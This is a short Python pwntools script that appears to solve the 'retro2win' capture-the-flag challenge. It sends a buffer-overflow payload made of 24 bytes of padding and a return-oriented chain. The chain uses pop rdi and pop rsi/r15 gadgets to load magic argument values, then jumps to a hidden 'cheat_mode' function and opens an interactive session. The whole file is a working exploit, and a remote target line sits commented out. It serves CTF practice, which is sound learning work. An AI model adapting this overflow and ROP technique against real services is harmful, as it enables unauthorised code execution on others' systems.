#!/usr/bin/python3

from pwn import *

exe = ELF('./retro2win', checksec=False)

p = process(exe.path)
# p = remote('retro2win.ctf.intigriti.io', 1338)

# gadget
pop_rdi = 0x00000000004009b3
pop_rsi_r15 = 0x00000000004009b1

p.sendlineafter('Select an option:\n', b'1337')


# payload
payload = b'a'*24
payload += p64(pop_rdi) + p64(0x2323232323232323)
payload += p64(pop_rsi_r15) + p64(0x4242424242424242) + p64(0)
payload += p64(exe.sym['cheat_mode'])
p.sendlineafter(b'Enter your cheatcode:\n', payload)

p.interactive()